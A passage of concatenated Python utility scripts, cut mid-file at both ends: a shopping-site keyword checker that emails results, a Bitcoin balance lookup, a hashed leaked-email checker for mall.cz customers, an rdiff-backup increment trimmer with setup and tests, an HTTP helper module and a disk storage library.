	sys.stderr.write("Searches not defined!\nCreate file '" + SEARCHES_TXT + "' and fill it with something, god dammit!\n")
	sys.exit(0)


#===============================================================================
#= Main program ================================================================
#===============================================================================
mail = "Fantasya checker brings you new content:\n\n"

send = False
for keyword in searches:
	data = c.getPage(url + keyword)

	if keyword not in old:
		old[keyword] = []
	
	for l in d.parseString(data).find("a"):
		if "href" in l.params and l.params["href"].startswith("/zbozi/") and len(l.childs) > 0 and not l.childs[0].isTag():
			name = l.getContent()
			link = base_url + l.params["href"]
		
			if name not in old[keyword]:
				if keyword not in mail:
					mail += "\nKeyword: " + keyword + ";"
				mail += "\t" + name + "; " + link + "\n"
			
				send = True
				old[keyword].append(name)


# payload
if send:
	if 0 != os.system("mailer -f hlubina@internetu.net -t bystrousak@kitakitsune.org -s 'Fantasya.cz checker' <<LKNDFOJASDKJ-\n" + mail + "\nLKNDFOJASDKJ-"):
		raise Exception("Can't send mail! Check your mailer!")


db["old"] = old
db.close()
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import time
import argparse
from collections import defaultdict

import requests


def retry(fn):
    def retry_decorator(*args, **kwargs):
        for _ in range(10):
            try:
                return fn(*args, **kwargs)
            except Exception:
                time.sleep(10)

        return fn(*args, **kwargs)

    return retry_decorator


@retry
def check_addresses(addr_list):
    multi_addr_template = "https://blockexplorer.com/api/addrs/utxo"

    r = requests.post(multi_addr_template, data={"addrs": ",".join(addr_list)})
    r.raise_for_status()

    results = r.json()

    simplified_results = defaultdict(float)
    for result in results:
        simplified_results[result["address"]] += result["amount"]

    for addr, balance in simplified_results.items():
        yield balance, addr


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "ADDRESS_LIST",
        type=argparse.FileType('r'),
        help="File with list of addresses."
    )

    args = parser.parse_args()
    addresses = args.ADDRESS_LIST.read().splitlines()

    for balance, addr in check_addresses(addresses):
        print balance, addr
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
from __future__ import print_function

import csv
import gzip
import hashlib
import argparse


def gen_hash(email):
    return hashlib.sha256(email.lower()).hexdigest()


def read_csv(csvFile):
    with open(csvFile, 'rb') as f:
        reader = csv.reader(f)
        return list(reader)


def read_hashes(fn):
    with gzip.open(fn) as f:
        hashes = f.read().splitlines()

    return set(hashes)


def check_email(email, email_hashes):
    return gen_hash(email) in email_hashes


def print_red(msg, *args, **kwargs):
    print("\033[31m%s\033[0m" % msg, *args)


def print_green(msg, *args, **kwargs):
    print("\033[32m%s\033[0m" % msg, *args)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="Test your email or CSV file with emails against data from mall.cz."
    )
    parser.add_argument(
        "--email",
        help="Your email."
    )
    parser.add_argument(
        "--csvFile",
        help="A CSV file with emails to be checked (email must appear at the first column)"
    )

    args = parser.parse_args()

    email_hashes = read_hashes("email_hash_db.txt.gz")

    if args.csvFile:
        print_red("Warning: List of leaked emails;")
        for email in read_csv(args.csvFile):
            if check_email(email[0], email_hashes):
                print_red(email[0])
    else:
        if check_email(args.email, email_hashes):
            print_red("Warning: Your email (%s), password, name and phone leaked!" % args.email)
        else:
            print_green("Your email (%s) was not found in the leaked data." % args.email)
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import gzip

from tqdm import tqdm

from check_email import gen_hash


def parse_email(line):
    line = line.split("#")[0]

    email = line.split(":")[0]

    return email.strip()


def read_custommer_list(fn):
    with open(fn) as f:
        for line in f:
            email = parse_email(line)

            if email:
                yield email


if __name__ == '__main__':
    email_db = set()

    for email in read_custommer_list("customers.txt"):
        email_db.add(email)

    with gzip.open("email_hash_db.txt.gz", "wb") as f:
        for email in tqdm(email_db):
            email_hash = gen_hash(email)
            f.write(email_hash + "\n")
# -*- coding: utf-8 -*-
from .trimmer import main

from .rdiff_api import RdiffAPI
from .rdiff_api import Increment
# -*- coding: utf-8 -*-
import os
import os.path
import sys

import datetime
from collections import defaultdict

from rdiff_api import RdiffAPI
from rdiff_api import Increment


def remove_even(rsync_dir, out_dir, disable_compression=False):
    rsync = RdiffAPI(rsync_dir)

    odd_increments = [
        increment for cnt, increment in enumerate(rsync.yield_increments())
        if ((cnt + 1) % 2) != 0
    ]

    rsync.restore_into(
        out_dir,
        odd_increments,
        disable_compression=disable_compression
    )


def keep_one_for_each_month(rsync_dir, out_dir, all_from_last_3_months=True,
                            disable_compression=False):
    rsync = RdiffAPI(rsync_dir)

    def get_month_date(increment):
        date = datetime.datetime.fromtimestamp(increment.timestamp)
        return date.strftime('%Y-%m')

    month_tracker = defaultdict(list)
    for increment in rsync.yield_increments():
        month_tracker[get_month_date(increment)].append(increment)

    last_from_each_month = {
        increments[-1]
        for increments in month_tracker.itervalues()
    }

    if all_from_last_3_months:
        all_months = sorted(month_tracker.keys())

        last_from_each_month.update(month_tracker[all_months[-1]])

        if len(all_months) >= 2:
            last_from_each_month.update(month_tracker[all_months[-2]])
        if len(all_months) >= 3:
            last_from_each_month.update(month_tracker[all_months[-3]])

    rsync.restore_into(
        out_dir,
        sorted(last_from_each_month),
        disable_compression=disable_compression
    )


def _check_multiple_parameters(args):
    counter = 0

    if args.list:
        counter += 1
    if args.each_month:
        counter += 1
    if args.remove_even:
        counter += 1

    return counter > 1


def main(args):
    if args.list and not os.path.exists(args.list):
        sys.stderr.write("Increment list file `%s` not found!\n" % args.list)
        sys.exit(1)

    if not os.path.exists(args.rsync_dir):
        sys.stderr.write("rsync directory `%s` not found!\n" % args.rsync_dir)
        sys.exit(1)

    if _check_multiple_parameters(args):
        sys.stderr.write(
            "You can set only one of --keep-increments OR --one-for-each-month"
            " OR --remove-even, not all at once!\n"
        )
        sys.exit(1)

    if args.out_dir is None:
        args.out_dir = os.path.abspath(args.rsync_dir) + "_trimmed"

    if args.remove_even:
        remove_even(args.rsync_dir, args.out_dir, args.disable_compression)
    elif args.each_month:
        keep_one_for_each_month(
            args.rsync_dir,
            args.out_dir,
            args.disable_compression
        )
    elif args.list:
        with open(args.list) as f:
            increments_to_keep = [
                Increment.from_string(x.strip().split()[0])
                for x in f.read().splitlines()
            ]

        rdiff = RdiffAPI(args.rsync_dir)
        rdiff.restore_into(
            args.out_dir,
            increments_to_keep,
            disable_compression=args.disable_compression
        )
    else:
        sys.stderr.write("No action selected. Use --help for list.\n")
        sys.exit(1)
# -*- coding: utf-8 -*-
import os
from shutil import rmtree
from tempfile import mkdtemp

import sh


class Increment(object):
    def __init__(self, timestamp):
        self.timestamp = timestamp

    @staticmethod
    def from_string(line):
        timestamp = int(line.strip().split()[0])
        return Increment(timestamp)


class RdiffAPI(object):
    def __init__(self, rsync_dir, tmp_dir=None, disable_compression=False):
        self.rsync_dir = rsync_dir

        self._tmp_dir = tmp_dir
        if self._tmp_dir is None:
            self._tmp_dir = mkdtemp()

        self._disable_compression = disable_compression

        self._options = []

    def yield_increments(self):
        increments = sh.rdiff_backup("--parsable-output", "-l", self.rsync_dir)

        for increment_line in increments:
            yield Increment.from_string(increment_line)

    def restore(self, out_dir, time):
        sh.rdiff_backup("-r", time, self.rsync_dir, out_dir)

    def add_increment(self, from_dir, timestamp=0):
        options = self._options[:]
        if timestamp != 0:
            options.extend(("--current-time", timestamp))

        if self._disable_compression:
            options.append("--no-compression")

        options.append(from_dir)
        options.append(self.rsync_dir)

        sh.rdiff_backup(*options)

    def restore_into(self, out_dir, increments_to_keep,
                     disable_compression=False):
        out_rsync = RdiffAPI(out_dir, disable_compression=disable_compression)
        for increment in sorted(increments_to_keep, key=lambda x: x.timestamp):
            rmtree(self._tmp_dir)
            os.mkdir(self._tmp_dir)

            print "Restoring", increment.timestamp

            self.restore(self._tmp_dir, increment.timestamp)
            out_rsync.add_increment(self._tmp_dir, increment.timestamp)

        rmtree(self._tmp_dir)
        return out_rsync
#! /usr/bin/env python3


def get_version(data):
    def all_same(s):
        return all(x == s[0] for x in s)

    def has_digit(s):
        return any(x.isdigit() for x in s)

    data = data.splitlines()
    return list(
        line for line, underline in zip(data, data[1:])
        if (len(line) == len(underline) and
            all_same(underline) and
            has_digit(line) and
            "." in line),
    )[0]
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
from setuptools import setup
from setuptools import find_packages

from docs import get_version


CHANGELOG = open('CHANGES.rst').read()
LONG_DESCRIPTION = "\n\n".join([
    open('README.rst').read(),
    CHANGELOG
])


setup(
    name='rdiff_trimmer',
    version=get_version(CHANGELOG),
    py_modules=['rsync_trimmer'],

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    url='https://github.com/Bystroushaak/rdiff_trimmer',
    license='MIT',
    description='Get rid of the old rdiff-backup increments from your backup.',

    long_description=LONG_DESCRIPTION,

    packages=find_packages('src'),
    package_dir={'': 'src'},

    install_requires=open("requirements.txt").read().splitlines(),
    include_package_data=True,

    classifiers=[
        "License :: OSI Approved :: MIT License",

        "Programming Language :: Python",
        "Programming Language :: Python :: 2.7",
    ],

    scripts=[
        'bin/rdiff_trimmer',
        'bin/unpack_rdiff_increments',
    ],

    extras_require={
        "test": [
            "pytest",
            "pytest-cov",
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    }
)
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import os
import shutil
import os.path
import tempfile

from rdiff_trimmer.rdiff_api import RdiffAPI
from rdiff_trimmer.rdiff_api import Increment


DIR_PATH = os.path.abspath(os.path.dirname(__file__))


class TestIncrement(object):
    def test_increment_from_string(self):
        inc_line = "   1524336818 directory   "

        inc = Increment.from_string(inc_line)

        assert inc.timestamp == 1524336818.0


class TestRdiffAPI(object):
    def setup(self):
        self.ra = RdiffAPI(os.path.join(DIR_PATH, "test_data"))
        self.tmp_dir = tempfile.mkdtemp()
        self.out_ra = RdiffAPI(self.tmp_dir)

    def teardown(self):
        shutil.rmtree(self.tmp_dir)

    def test_yield_increments(self):
        increments = list(self.ra.yield_increments())

        assert len(increments) == 3

        assert increments[1].timestamp == 1524342591.0
        assert increments[2].timestamp == 1524342605.0

    def test_restore_into(self):
        increments = list(self.ra.yield_increments())

        self.ra.restore_into(self.tmp_dir, increments_to_keep=[increments[0]])

        kept_increments = list(self.out_ra.yield_increments())

        assert len(kept_increments) == 1
        assert kept_increments[0].timestamp == increments[0].timestamp

        assert os.path.exists(os.path.join(self.tmp_dir, "content"))
        assert not os.path.exists(os.path.join(self.tmp_dir, "and_more_content"))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import sys
import shutil
import os.path
import argparse

from virtualenvapi.manage import VirtualEnvironment


# Variables ===================================================================
DEFAULT_ENV_NAME = "./xex"


# Functions & classes =========================================================
def install_package(pkg_name, keep, env_name):
    if os.path.exists(pkg_name):
        pkg_name = os.path.abspath(pkg_name)

    env = VirtualEnvironment(os.path.abspath(env_name), cache="")

    env.install(pkg_name)

    installed = env.is_installed(pkg_name)

    if installed:
        print "Installation successful."
    else:
        print "FAIL!"

    if not keep:
        shutil.rmtree(env_name)

    return installed


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="Test installation of the package from PYPI."
    )
    parser.add_argument(
        "-p",
        "--package",
        required=True,
        help="Name of the PIP package which will be installed."
    )
    parser.add_argument(
        "-k",
        "--keep",
        action="store_true",
        help="Don't remove virtualenv's directory."
    )
    parser.add_argument(
        "-e",
        "--env-name",
        default=DEFAULT_ENV_NAME,
        help="Name of the environment. Default %s." % DEFAULT_ENV_NAME
    )
    args = parser.parse_args()

    result = install_package(
        pkg_name=args.package,
        keep=args.keep,
        env_name=args.env_name
    )

    sys.exit(not result)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This work is licensed under a Creative Commons (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor. This module uses epydoc.
__name    = "CheckerTools"
__version = "1.5.2"
__date    = "04.05.2013"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
__url     = "https://github.com/Bystroushaak/CheckerTools"

# Imports ======================================================================
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse
import re



# Variables ====================================================================
IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8; windows-1250",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
"Headers from Internet explorer."

LFFHeaders = {
	"User-Agent": "Mozilla/5.0 (X11; U; Linux i686; cs; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8; windows-1250",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
"Headers from Firefox 3.6.3 on linux."


DEFAULT_HEADERS = IEHeaders
hcookies = False
cookies = {}
"Variable where are stored cookies."



#= Functions & objects =========================================================
def getDomain(url):
	"""
	Parse domain from url.

	@param url: URL
	@type  url: string

	@return: Domain
	@rtype:  string
	"""
	if "://" in url:
		url = url.split("://")[1]
		
	if "/" in url:
		url = url.split("/")[0]

	return url


def getPage(url, get = None, post = None, headers = DEFAULT_HEADERS, handle_cookies = False):
	"""
	Function for easy work with HTTP protocol.

	@param url: URL - if not "://" in url, url will be transformed into "http://" + url
	@type  url: string

	@param get: Params which will be sended as GET.
	@type  get: dictionary

	@param post: Parameters for url. Default None.
	@type  post: dictionary or string

	@param headers: Headers sended when downloading url. Default DEFAULT_HEADERS.
	@type  headers: dictionary
	@see: IEHeaders
	@see: LFFHeaders
	@see: DEFAULT_HEADERS
	
	@param handle_cookies: If True, function will use cookies.
						   Cookies are stored in global variable cookies.
						   If you dont want set this parameter to true with every call,
						   you can set module variable hcookies to True.
	@type  handle_cookies: bool
	@see: hcookies

	@return: content of downloaded url
	@rtype: Binary data or text, depends on type of downloaded content.
	"""
	# POST params
	if post != None and type(post) == dict:
		post = urllib.parse.urlencode(post)
		
	# append GET params to url
	if get != None:
		get = urllib.parse.urlencode(get)
		if "?" in url:
			if url[-1] == "&":
				url += get
			else:
				url += "&" + get
		else:
			url += "?" + get
			
		get = None
	   
	# url protocol check
	if not "://" in url:
		url = "http://" + url

	# add cokies into headers
	if hcookies or handle_cookies:
		domain = getDomain(url)
		if domain in list(cookies.keys()):
			cookie_string = ""
			for key in list(cookies[domain].keys()):
				cookie_string += key + "=" + str(cookies[domain][key]) + "; "
				
			headers["Cookie"] = cookie_string.strip()

	# download page    
	f = urllib.request.urlopen(urllib.request.Request(url, post, headers))
	data = f.read()

	# simple cookies handling
	if hcookies or handle_cookies:
		cs = list(f.info().items())   # get header from server
		
		# parse "set-cookie" string
		cookie_string = ""
		for c in cs:
			if c[0].lower() == "set-cookie":
				cookie_string = c[1]
					
		# parse keyword:values
		tmp_cookies = {}
		for c in cookie_string.split(","):
			cookie = c
			if ";" in c:
				cookie = c.split(";")[0]
			cookie = cookie.strip()
			
			cookie = cookie.split("=")
			keyword = cookie[0]
			value = "=".join(cookie[1:])
			
			tmp_cookies[keyword] = value
		
		# append global variable cookis with new cookies
		if len(tmp_cookies) > 0:
			domain = getDomain(url)
			
			if domain in list(cookies.keys()):
				for key in list(tmp_cookies.keys()):
					cookies[domain][key] = tmp_cookies[key] 
			else:
				cookies[domain] = tmp_cookies
			  
		# check for blank cookies
		if len(cookies) > 0:
			for domain in list(cookies.keys()):
				for key in list(cookies[domain].keys()):
					if cookies[domain][key].strip() == "":
						del cookies[domain][key]
				
				if len(cookies[domain]) == 0:
					del cookies[domain]                
	
	f.close()

	return data


def removeTags(txt):
	"""
	Remove tags from text. Every text field between < and > will be deleted.

	@param txt: Text which will be cleared.
	@type  txt: string

	@return: Cleared text.
	@rtype:  string
	"""
	for i in re.findall(r"""<(?:"[^"]*"['"]*|'[^']*'['"]*|[^'">])+>""", txt):
		txt = txt.replace(i, "")
		
	return txt.strip()


def getVisibleText(txt):
	"""
	Removes tags and text between <title>, <script> and <style> tags.

	@param txt: Text which will be cleared.
	@type  txt: string

	@return: Cleared text.
	@rtype:  string
	"""
	for i in re.findall(r"""<script.*?>[\s\S]*?</.*?script>""", txt):
		txt = txt.replace(i, "")

	for i in re.findall(r"""<style.*?>[\s\S]*?</.*?style>""", txt):
		txt = txt.replace(i, "")

	for i in re.findall(r"""<title.*?>[\s\S]*?</.*?title>""", txt):
		txt = txt.replace(i, "")

	return removeTags(txt)



#= Main program ================================================================
if __name__ == "__main__":
	print(__name + " " + __version + " " + __date + " by " + __author + " (" + __email + ")")
	print(__url)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# This work is licensed under a Creative Commons Licence
# (http://creativecommons.org/licenses/by/3.0/cz/).
# This module uses epydoc.
#
__name    = "CheckerTools"
__version = "1.5.2"
__date    = "04.05.2013"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
__url     = "https://github.com/Bystroushaak/CheckerTools"
#
# Imports =====================================================================
import urllib
import urllib2
import re



# Variables ===================================================================
IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
"Headers from Internet explorer."

LFFHeaders = {
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
"Headers from Firefox 3.6.3 on linux."


DEFAULT_HEADERS = IEHeaders
hcookies = False
cookies = {}
"Variable where are stored cookies."



#= Functions & objects ========================================================
def getDomain(url):
	"""
	Parse domain from url.

	@param url: URL
	@type  url: string

	@return: Domain
	@rtype:  string
	"""
	if "://" in url:
		url = url.split("://")[1]

	if "/" in url:
		url = url.split("/")[0]

	return url


def getPage(url, get = None, post = None, headers = DEFAULT_HEADERS, handle_cookies = False):
	"""
	Function for easy work with HTTP protocol.

	@param url: URL - if not "://" in url, url will be transformed into "http://" + url
	@type  url: string

	@param get: Params which will be sended as GET.
	@type  get: dictionary

	@param post: Parameters for url. Default None.
	@type  post: dictionary or string

	@param headers: Headers sended when downloading url. Default DEFAULT_HEADERS.
	@type  headers: dictionary
	@see: IEHeaders
	@see: LFFHeaders
	@see: DEFAULT_HEADERS
	
	@param handle_cookies: If True, function will use cookies.
						   Cookies are stored in global variable cookies.
						   If you dont want set this parameter to true with every call,
						   you can set module variable hcookies to True.
	@type  handle_cookies: bool
	@see: hcookies

	@return: content of downloaded url
	@rtype: Binary data or text, depends on type of downloaded content.
	"""
	# POST params
	if post is not None and type(post) == dict:
		post = urllib.urlencode(post)

	# append GET params to url
	if get is not None:
		get = urllib.urlencode(get)
		if "?" in url:
			if url[-1] == "&":
				url += get
			else:
				url += "&" + get
		else:
			url += "?" + get

		get = None

	# url protocol check
	if not "://" in url:
		url = "http://" + url

	# add cokies into headers
	if hcookies or handle_cookies:
		domain = getDomain(url)
		if domain in cookies.keys():
			cookie_string = ""
			for key in cookies[domain].keys():
				cookie_string += key + "=" + str(cookies[domain][key]) + "; "

			headers["Cookie"] = cookie_string.strip()

	# download page
	f = urllib2.urlopen(urllib2.Request(url, post, headers))
	data = f.read()

	# simple cookies handling
	if hcookies or handle_cookies:
		cs = f.info().items()   # get header from server

		# parse "set-cookie" string
		cookie_string = ""
		for c in cs:
			if c[0].lower() == "set-cookie":
				cookie_string = c[1]

		# parse keyword:values
		tmp_cookies = {}
		for c in cookie_string.split(","):
			cookie = c
			if ";" in c:
				cookie = c.split(";")[0]
			cookie = cookie.strip()

			cookie = cookie.split("=")
			keyword = cookie[0]
			value = "=".join(cookie[1:])

			tmp_cookies[keyword] = value

		# append global variable cookis with new cookies
		if len(tmp_cookies) > 0:
			domain = getDomain(url)

			if domain in cookies.keys():
				for key in tmp_cookies.keys():
					cookies[domain][key] = tmp_cookies[key]
			else:
				cookies[domain] = tmp_cookies

		# check for blank cookies
		if len(cookies) > 0:
			for domain in cookies.keys():
				for key in cookies[domain].keys():
					if cookies[domain][key].strip() == "":
						del cookies[domain][key]

				if len(cookies[domain]) == 0:
					del cookies[domain]

	f.close()

	return data


def removeTags(txt):
	"""
	Remove tags from text. Every text field between < and > will be deleted.

	@param txt: Text which will be cleared.
	@type  txt: string

	@return: Cleared text.
	@rtype:  string
	"""
	for i in re.findall(r"""<(?:"[^"]*"['"]*|'[^']*'['"]*|[^'">])+>""", txt):
		txt = txt.replace(i, "")

	return txt.strip()


def getVisibleText(txt):
	"""
	Removes tags and text between <title>, <script> and <style> tags.

	@param txt: Text which will be cleared.
	@type  txt: string

	@return: Cleared text.
	@rtype:  string
	"""
	for i in re.findall(r"""<script.*?>[\s\S]*?</.*?script>""", txt):
		txt = txt.replace(i, "")

	for i in re.findall(r"""<style.*?>[\s\S]*?</.*?style>""", txt):
		txt = txt.replace(i, "")

	for i in re.findall(r"""<title.*?>[\s\S]*?</.*?title>""", txt):
		txt = txt.replace(i, "")

	return removeTags(txt)



#= Main program ===============================================================
if __name__ == "__main__":
	print __name + " " + __version + " " + __date + " by " + __author,
	print "(" + __email + ")"
	print __url
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import shutil
import zipfile

from BalancedDiscStorage.path_and_hash import PathAndHash
from BalancedDiscStorage.balanced_disc_storage import BalancedDiscStorage


# Functions & classes =========================================================
class BalancedDiscStorageZ(BalancedDiscStorage):
    """
    This class is the same as :class:`.BalancedDiscStorage`, but it also allows
    adding the ``.zip`` files, which are unpacked to proper path in storage.
    """
    def __init__(self, path):
        super(BalancedDiscStorageZ, self).__init__(path)

        self.max_zipfiles = self.dir_limit  #: How many files may be in .zip

    def _unpack_zip(self, file_obj, path):
        """
        Unpack .zip archive in `file_obj` to given `path`. Make sure, that it
        fits into limits (see :attr:`._max_zipfiles` for details).

        Args:
            file_obj (file): Opened file-like object.
            path (str): Path into which the .zip will be unpacked.

        Raises:
            ValueError: If there is too many files in .zip archive.
        """
        old_cwd = os.getcwd()
        os.chdir(path)

        zip_obj = zipfile.ZipFile(file_obj)
        for cnt, zip_info in enumerate(zip_obj.infolist()):
            zip_obj.extract(zip_info)

            if cnt + 1 > self.max_zipfiles:
                os.chdir(old_cwd)

                msg = "Too many files in .zip "
                msg += "(self.max_zipfiles == {}, but {} given).".format(
                    self.max_zipfiles,
                    cnt + 1,
                )
                raise ValueError(msg)

        os.chdir(old_cwd)

    def add_archive_as_dir(self, zip_file_obj):
        """
        Add archive to the storage and unpack it.

        Args:
            zip_file_obj (file): Opened file-like object.

        Returns:
            obj: Path where the `zip_file_obj` was unpacked wrapped in \
                 :class:`.PathAndHash` structure.

        Raises:
            ValueError: If there is too many files in .zip archive. \
                        See :attr:`._max_zipfiles` for details.
            AssertionError: If the `zip_file_obj` is not file-like object.
        """
        BalancedDiscStorage._check_interface(zip_file_obj)

        file_hash = self._get_hash(zip_file_obj)
        dir_path = self._create_dir_path(file_hash)
        full_path = os.path.join(dir_path, file_hash)

        if os.path.exists(full_path):
            shutil.rmtree(full_path)

        os.mkdir(full_path)

        try:
            self._unpack_zip(zip_file_obj, full_path)
        except Exception:
            shutil.rmtree(full_path)
            raise

        return PathAndHash(path=full_path, hash=file_hash)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from BalancedDiscStorage.path_and_hash import PathAndHash
from BalancedDiscStorage.balanced_disc_storage import BalancedDiscStorage
from BalancedDiscStorage.balanced_disc_storage_z import BalancedDiscStorageZ
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================


# Functions & classes =========================================================
class PathAndHash(str):
    """
    Path representation, which also holds hash.

    Note:
        This class is based on `str`, with which is fully interchangeable.
        ::
            str(PathAndHash(path="xe", hash="asd")) == "xe"

    Attributes:
        path (str): Path to the file.
        hash (str): Hash of the file.
    """
    def __new__(self, path, hash=None):
        return super(PathAndHash, self).__new__(self, path)

    def __init__(self, path, hash=None):
        super(PathAndHash, self).__init__(path)

        self.path = path
        self.hash = hash

    def __repr__(self):
        return self.path
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import shutil
import hashlib

from BalancedDiscStorage.path_and_hash import PathAndHash


# Functions & classes =========================================================
class BalancedDiscStorage(object):
    """
    Store files, make sure, that there are never more files in one directory
    than :attr:`_dir_limit`.
    """
    def __init__(self, path, dir_limit=32000):
        self.path = path  #: Path on which the storage operates.
        self._assert_path_is_rw()

        self.dir_limit = dir_limit  #: Maximal number of files in directory.
        self.read_bs = 2**16  #: File read blocksize.
        self.hash_builder = hashlib.sha256  #: Hashing function used for FN.

    def _assert_path_is_rw(self):
        """
        Make sure, that `self.path` exists, is directory a readable/writeable.

        Raises:
            IOError: In case that any of the assumptions failed.
            ValueError: In case that `self.path` is not set.
        """
        if not self.path:
            raise ValueError("`path` argument must be set!")

        if not os.path.exists(self.path):
            raise IOError("`%s` not found." % self.path)

        if not os.path.isdir(self.path):
            raise IOError("`%s` is not a directory!" % self.path)

        if not os.access(self.path, (os.R_OK or os.W_OK)):
            raise IOError(
                "Can't access `%s`, please check permissions." % self.path
            )

    def _get_file_iterator(self, file_obj):
        """
        For given `file_obj` return iterator, which will read the file in
        `self.read_bs` chunks.

        Args:
            file_obj (file): File-like object.

        Return:
            iterator: Iterator reading the file-like object in chunks.
        """
        file_obj.seek(0)

        return iter(lambda: file_obj.read(self.read_bs), '')

    def _get_hash(self, file_obj):
        """
        Compute hash for the `file_obj`.

        Attr:
            file_obj (obj): File-like object with ``.write()`` and ``.seek()``.

        Returns:
            str: Hexdigest of the hash.
        """
        size = 0
        hash_buider = self.hash_builder()
        for piece in self._get_file_iterator(file_obj):
            hash_buider.update(piece)
            size += len(piece)

        file_obj.seek(0)

        return "%s_%x" % (hash_buider.hexdigest(), size)

    @staticmethod
    def _check_interface(file_obj):
        """
        Make sure, that `file_obj` has `.read()` and `.seek()` attributes.

        Args:
            file_obj (file): File like object.

        Raises:
            AssertionError: In case that assumptions fails.
        """
        ERR = "`file_obj` have to be file-like object (.read() and .seek())!"
        assert hasattr(file_obj, "read"), ERR
        assert hasattr(file_obj, "seek"), ERR

    def _create_dir_path(self, file_hash, path=None, hash_list=None):
        """
        Create proper filesystem paths for given `file_hash`.

        Args:
            file_hash (str): Hash of the file for which the path should be
                      created.
            path (str, default None): Recursion argument, don't set this.
            hash_list (list, default None): Recursion argument, don't set this.

        Returns:
            str: Created path.
        """
        # first, non-recursive call - parse `file_hash`
        if hash_list is None:
            hash_list = list(file_hash)

        if not hash_list:
            raise IOError("Directory structure is too full!")

        # first, non-recursive call - look for subpath of `self.path`
        if not path:
            path = os.path.join(
                self.path,
                hash_list.pop(0)
            )

        # if the path not yet exists, create it and work on it
        if not os.path.exists(path):
            os.mkdir(path)
            return self._create_dir_path(
                file_hash=file_hash,
                path=path,
                hash_list=hash_list
            )

        files = os.listdir(path)

        # file is already in storage
        if file_hash in files:
            return path

        # if the directory is not yet full, use it
        if len(files) < self.dir_limit:
            return path

        # in full directories create new sub-directories
        return self._create_dir_path(
            file_hash=file_hash,
            path=os.path.join(path, hash_list.pop(0)),
            hash_list=hash_list
        )

    def file_path_from_hash(self, file_hash, path=None, hash_list=None):
        """
        For given `file_hash`, return path on filesystem.

        Args:
            file_hash (str): Hash of the file, for which you wish to know the
                      path.
            path (str, default None): Recursion argument, don't set this.
            hash_list (list, default None): Recursion argument, don't set this.

        Returns:
            str: Path for given `file_hash` contained in :class:`.PathAndHash`\
                 object.

        Raises:
            IOError: If the file with corresponding `file_hash` is not in \
                     storage.
        """
        # first, non-recursive call - parse `file_hash`
        if hash_list is None:
            hash_list = list(file_hash)

        if not hash_list:
            raise IOError("Directory structure is too full!")

        # first, non-recursive call - look for subpath of `self.path`
        if not path:
            path = os.path.join(
                self.path,
                hash_list.pop(0)
            )

        files = os.listdir(path)

        # is the file/unpacked archive in this `path`?
        if file_hash in files:
            full_path = os.path.join(path, file_hash)

            if os.path.isfile(full_path):
                return PathAndHash(path=full_path, hash=file_hash)

            return PathAndHash(path=full_path + "/", hash=file_hash)

        # end of recursion, if there are no more directories to look into
        next_path = os.path.join(path, hash_list.pop(0))
        if not os.path.exists(next_path):
            raise IOError("File not found in the structure.")

        # look into subdirectory
        return self.file_path_from_hash(
            file_hash=file_hash,
            path=next_path,
            hash_list=hash_list
        )

    def add_file(self, file_obj):
        """
        Add new file into the storage.

        Args:
            file_obj (file): Opened file-like object.

        Returns:
            obj: Path where the file-like object is stored contained with hash\
                 in :class:`.PathAndHash` object.

        Raises:
            AssertionError: If the `file_obj` is not file-like object.
            IOError: If the file couldn't be added to storage.
        """
        BalancedDiscStorage._check_interface(file_obj)

        file_hash = self._get_hash(file_obj)
        dir_path = self._create_dir_path(file_hash)

        final_path = os.path.join(dir_path, file_hash)

        def copy_to_file(from_file, to_path):
            with open(to_path, "wb") as out_file:
                for part in self._get_file_iterator(from_file):
                    out_file.write(part)

        try:
